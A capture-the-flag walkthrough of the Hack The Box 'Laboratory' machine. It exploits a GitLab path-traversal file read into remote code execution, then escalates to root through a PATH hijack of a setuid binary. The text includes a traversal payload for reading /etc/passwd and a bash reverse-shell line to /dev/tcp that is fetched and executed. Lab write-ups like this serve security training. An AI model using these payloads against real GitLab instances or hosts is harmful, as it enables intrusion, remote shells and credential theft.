---
title: Laboratory HTB
date: '2021-04-17 16:00:00'
categories: ["htb"]
---

# Laboratory 🧪

# User

First we start by scanning the provided ip using nmap.

![nmap](https://user-images.githubusercontent.com/16364370/102066204-8a1ee980-3dc7-11eb-84ca-b93bca7d749d.png)

We have 3 common ports available, first lets visit port 80 using our web browser.
We get redirected to a hostname *https://laboratory.htb/* on https. Let add this to our hosts file.

![Websiteport80 png](https://user-images.githubusercontent.com/16364370/102066209-8b501680-3dc7-11eb-8d0e-713ccef8df86.png)

We don't get any usefull info from here besides some clients names we may need later.

![Websiteport80](https://user-images.githubusercontent.com/16364370/102066208-8ab78000-3dc7-11eb-9e99-c23f2c9ee270.png)

Looking again at Nmap result we got another hostname *git.laboratory.htb*. Nmap took this from the ssl Subject Alternative Name.I add this to my hosts file and visit it.

![gitlab](https://user-images.githubusercontent.com/16364370/102066199-89865300-3dc7-11eb-94e8-473edd03c1db.png)

Gitlab is installed. Because I don't have any username or password I try to signup but there is a problem.

![emaildomainprohibited](https://user-images.githubusercontent.com/16364370/102066197-88edbc80-3dc7-11eb-9559-034a74fecc04.png)

I try to enter an email like this *fuxsocy@laboratory.htb* and it works. Now that I am logged in I can visit https://git.laboratory.htb/help and see which version this gitlab instance is.

![gitlabversion](https://user-images.githubusercontent.com/16364370/102066202-89865300-3dc7-11eb-9303-ccd34cf5fe8d.png)

After knowing the version I search for exploits. 
There is an open report disclosed via hackerone to gitlab team about an lfi https://hackerone.com/reports/827052.
We can read internal files by creating two repositories `a` and `b`. Then we create an issue on the repo `a` by adding a description `![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)` where `/etc/passwd` is the file we want to read. We then move this created issue to repository `b` and the file will be available to download. But we need to get a shell on the machine. I tried to get ssh private keys but I was unable. Looking at the same report on hackerone the author also provided a way to gain rce.

![rcegitlab](https://user-images.githubusercontent.com/16364370/102066205-8ab78000-3dc7-11eb-83ce-090f172a05d0.png)

I was able to get the _secret_key_base_ file so I continued with the exploit. To do this I created a docker instance on a digitalocean vps as my machine is a slow and docker with gitlab needs a lot of resources(I tried it lol). 
First we install docker.

![docker io install](https://user-images.githubusercontent.com/16364370/102066610-06193180-3dc8-11eb-8e43-fe7f6b8e42a4.png)

Going to [dockerhub](https://hub.docker.com/) we find a docker version which is vulnerable. [Here](https://hub.docker.com/r/gitlab/gitlab-ce/tags?page=4&ordering=last_updated) is the page which has a version prior to the one which is vulnerable. I use version 12.8.6-ce.0 , ce indicates community edition.
These commands will install gitlab inside a docker container.

![gitlabinstalldocker](https://user-images.githubusercontent.com/16364370/102066642-103b3000-3dc8-11eb-9a24-d909766eac95.png)

This will take some time to complete, and start. I enter docker using the following commands.

![dockerenter](https://user-images.githubusercontent.com/16364370/102080898-4636df00-3ddd-11eb-9edd-9f34fcac28dc.png)

Now I need to get the file `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` from laboratory machine using lfi and then replace it with the one inside the docker container. After we enter `gitlab-rails console` and try to create a cookie with a payload which will send a get request to test if the payload works.

![cookie exploit](https://user-images.githubusercontent.com/16364370/102080890-43d48500-3ddd-11eb-8ee4-ce1c2aacfc17.png)

Now we copy this and send it using curl.

![curlsend](https://user-images.githubusercontent.com/16364370/102080893-4505b200-3ddd-11eb-92d9-57a821a11e5e.png)

And we successfully get a connection back.

![exploitworkstest](https://user-images.githubusercontent.com/16364370/102080900-46cf7580-3ddd-11eb-8946-084db386f20d.png)

I do the same, the first command will be to fetch a file containing `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` form my web server. The second command will make it executable using `chmod` and the final command will run it. Each of the command are sent reparately.

![gotshell](https://user-images.githubusercontent.com/16364370/102080904-47680c00-3ddd-11eb-81ec-2cb4b2c78cea.png)

I am inside the docker container which contains gitlab. I can now enter `gitlab-rails console` and change `administrator` password which will give me access to all repositories.

![gitlab-railsconsolepasswordchange](https://user-images.githubusercontent.com/16364370/102080903-47680c00-3ddd-11eb-952f-c9229c30499e.png)

Dexter is the administrator username and the password I just changed it to `secret_pass`.
When loggin in as dexter we can see all repositories, but the one repo from dexter contained an id_rsa ssh key.

![dexteridrsasshkey](https://user-images.githubusercontent.com/16364370/102080894-4505b200-3ddd-11eb-9ef1-b1e8b1e789eb.png)

I use with ssh and get user.txt

![dexterssh](https://user-images.githubusercontent.com/16364370/102080896-459e4880-3ddd-11eb-92c0-3795c17820ce.png)

# Root

Looking at todo.txt we see a todo which is highlighted:

![dockersecurityroot](https://user-images.githubusercontent.com/16364370/102080899-4636df00-3ddd-11eb-9a0f-6e8608b43d5f.png)

I find a file _docker-security_ located in **/usr/local/bin/docker-security** which has setuid bit set. I copy the binary to my machine using nc and then I run strings on it.

![runschmod](https://user-images.githubusercontent.com/16364370/102080908-48993900-3ddd-11eb-8da6-1509d2c60cfa.png)

Looking into this we can see that it runs chmod using relative path. So If we change our terminal path to a directory we want and then create a malicious file named chmod it will run that file instead resulting in running root code for us.

![privescchmodrelativepath](https://user-images.githubusercontent.com/16364370/102080906-4800a280-3ddd-11eb-9341-f3d443138750.png)

And We get our connection back and read root.txt.

![root](https://user-images.githubusercontent.com/16364370/102080907-4800a280-3ddd-11eb-8781-f921fc729e70.png)


